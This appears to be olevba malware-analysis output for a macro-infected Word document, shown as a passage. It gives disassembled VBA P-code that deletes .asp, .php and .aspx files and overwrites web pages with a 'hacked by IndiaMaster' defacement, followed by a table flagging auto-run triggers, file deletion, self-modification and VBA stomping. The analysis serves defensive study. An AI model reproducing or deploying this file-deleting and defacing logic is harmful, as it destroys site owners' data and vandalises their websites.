' 	Ld s 
' 	LitStr 0x0005 "*.asp"
' 	ArgsCall (Call) deleteFILE 0x0002 
' Line #300:
' 	Ld s 
' 	LitStr 0x0005 "*.php"
' 	ArgsCall (Call) deleteFILE 0x0002 
' Line #301:
' 	Ld s 
' 	LitStr 0x0006 "*.aspx"
' 	ArgsCall (Call) deleteFILE 0x0002 
' Line #302:
' 	Ld s 
' 	LitStr 0x0006 "*.php3"
' 	ArgsCall (Call) deleteFILE 0x0002 
' Line #303:
' Line #304:
' 	Label label1 
' Line #305:
' 	StartForVariable 
' 	Next 
' Line #306:
' Line #307:
' 	EndSub 
' Line #308:
' Line #309:
' 	QuoteRem 0x0000 0x0034 "----------------------------------------------------"
' Line #310:
' 	FuncDefn (Sub writeNEWASP(p As String))
' Line #311:
' 	OnError (Resume Next) 
' Line #312:
' Line #313:
' 	Ld p 
' 	ArgsCall Kill 0x0001 
' Line #314:
' Line #315:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #316:
' Line #317:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<html>"
' 	PrintItemNL 
' Line #318:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "<body bgcolor=#FF0000>"
' 	PrintItemNL 
' Line #319:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "<h1> This website has been hacked by IndiaMaster </h1>"
' 	PrintItemNL 
' Line #320:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "<p>"
' 	PrintItemNL 
' Line #321:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "<p>"
' 	PrintItemNL 
' Line #322:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "<p>"
' 	PrintItemNL 
' Line #323:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "<h2> drop me mail at: <a>tsunami.india@indiatimes.com</a></h2>"
' 	PrintItemNL 
' Line #324:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</body>"
' 	PrintItemNL 
' Line #325:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</html>"
' 	PrintItemNL 
' Line #326:
' Line #327:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #328:
' Line #329:
' Line #330:
' 	EndSub 
' Line #331:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

